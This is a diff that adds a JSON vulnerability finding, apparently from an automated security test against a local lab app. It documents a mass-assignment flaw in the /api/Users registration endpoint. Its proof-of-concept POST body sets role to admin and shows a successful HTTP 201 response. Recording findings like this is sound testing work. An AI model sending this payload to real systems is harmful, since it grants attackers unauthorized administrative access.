@@ -1,0 +1,28 @@
+{
+  "id": "f_1784838135559_47f080",
+  "action": "confirm",
+  "title": "Mass Assignment Allows Admin Registration",
+  "severity": "high",
+  "finding_kind": "vuln",
+  "location": "/api/Users",
+  "url": "/api/Users",
+  "description": "The user registration endpoint at /api/Users accepts arbitrary JSON fields, including role-based fields such as 'role' and 'isAdmin'. An attacker can register a new user with elevated privileges by including additional fields in the POST body, such as {\"role\":\"admin\"} or {\"isAdmin\":true}. This allows creation of administrative accounts without any additional authorization steps, compromising the entire application's access control model.",
+  "poc": "POST /api/Users, body: {\"email\":\"hacker@test.com\",\"password\":\"test123\",\"role\":\"admin\"} → HTTP 201 with response containing \"role\":\"admin\", proving mass assignment",
+  "proof": "Observed mass assignment vulnerability on /api/Users endpoint. POST /api/Users with body {\"email\":\"hacker@test.com\",\"password\":\"test123\",\"role\":\"admin\"} returns HTTP 201 with user object containing \"role\":\"admin\" confirming the mass assignment succeeded.",
+  "how_captured": "script: evidence/mass_assignment.txt",
+  "evidence_ids": [
+    "ev_1784838135329_061265"
+  ],
+  "proof_excerpts": [
+    {
+      "evidence_id": "ev_1784838135329_061265",
+      "excerpt": "Observed mass assignment vulnerability on /api/Users endpoint. POST /api/Users with body {\"email\":\"hacker@test.com\",\"password\":\"test123\",\"role\":\"admin\"} returns HTTP 201 with user object containing \"role\":\"admin\" confirming the mass assignment succeeded.",
+      "role": "proof",
+      "step": 1,
+      "how_captured": "script: evidence/mass_assignment.txt"
+    }
+  ],
+  "affected_asset": "127.0.0.1",
+  "port": "3010",
+  "created_at": "2026-07-23T20:22:15.559Z"
+}
